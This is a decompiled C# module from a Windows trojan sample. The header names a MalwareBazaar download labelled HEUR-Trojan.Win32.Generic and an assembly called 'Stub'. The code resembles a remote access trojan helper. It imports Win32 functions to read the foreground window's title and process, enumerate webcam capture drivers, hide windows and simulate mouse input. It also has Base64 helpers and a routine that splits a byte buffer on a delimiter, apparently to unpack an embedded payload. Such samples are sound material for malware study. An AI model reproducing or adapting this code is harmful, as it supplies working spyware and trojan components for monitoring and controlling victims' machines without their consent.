// Decompiled with JetBrains decompiler
// Type: e
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 80F3D6AD-D502-4CFE-A32C-03E83ADAF2E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-17877cf37b9264ba88dcfd0825f321f42531f8b880c52b43c0606b0b2c06d548.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

[StandardModule]
internal sealed class e
{
  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern void mouse_event(
    int dwFlags,
    int dx,
    int dy,
    int cButtons,
    int dwExtraInfo);

  public static string BS(byte[] b) => Encoding.Default.GetString(b);

  public static Array fx(byte[] b, string WRD)
  {
    List<byte[]> numArrayList = new List<byte[]>();
    MemoryStream memoryStream1 = new MemoryStream();
    MemoryStream memoryStream2 = new MemoryStream();
    string[] strArray = Strings.Split(e.BS(b), WRD);
    memoryStream1.Write(b, 0, strArray[0].Length);
    memoryStream2.Write(b, checked (strArray[0].Length + WRD.Length), checked (b.Length - strArray[0].Length + WRD.Length));
    numArrayList.Add(memoryStream1.ToArray());
    numArrayList.Add(memoryStream2.ToArray());
    memoryStream1.Dispose();
    memoryStream2.Dispose();
    return (Array) numArrayList.ToArray();
  }

  public static string ENB(ref string s) => Convert.ToBase64String(Encoding.UTF8.GetBytes(s));

  public static string DEB(ref string s) => Encoding.UTF8.GetString(Convert.FromBase64String(s));

  public static string readtext(string l) => File.ReadAllText(l);

  [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool capGetDriverDescriptionA(
    short wDriver,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
    int cbName,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
    int cbVer);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowTextLength(long hwnd);

  public static string ACT()
  {
    string str;
    try
    {
      IntPtr foregroundWindow = e.GetForegroundWindow();
      if (foregroundWindow == IntPtr.Zero)
      {
        str = "";
      }
      else
      {
        int windowTextLength = e.GetWindowTextLength((long) foregroundWindow);
        string WinTitle = Strings.StrDup(checked (windowTextLength + 1), "*");
        e.GetWindowText(foregroundWindow, ref WinTitle, checked (windowTextLength + 1));
        int lpdwProcessID;
        e.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
        if (lpdwProcessID == 0)
        {
          str = WinTitle;
        }
        else
        {
          try
          {
            str = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            str = WinTitle;
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool IsWindowVisible(IntPtr hwnd);

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);

  public enum SW
  {
    Hide = 0,
    Normal = 1,
    ShowMinimized = 2,
    ShowMaximized = 3,
    ShowNoActivate = 4,
    Show = 5,
    Minimize = 6,
    ShowMinNoActive = 7,
    ShowNA = 8,
    Restore = 9,
    ShowDefault = 10, // 0x0000000A
    ForceMinimize = 11, // 0x0000000B
    Max = 11, // 0x0000000B
  }

  public enum GetWindowCmd : uint
  {
    GW_HWNDFIRST,
    GW_HWNDLAST,
    GW_HWNDNEXT,
    GW_HWNDPREV,
    GW_OWNER,
    GW_CHILD,
    GW_ENABLEDPOPUP,
  }
}
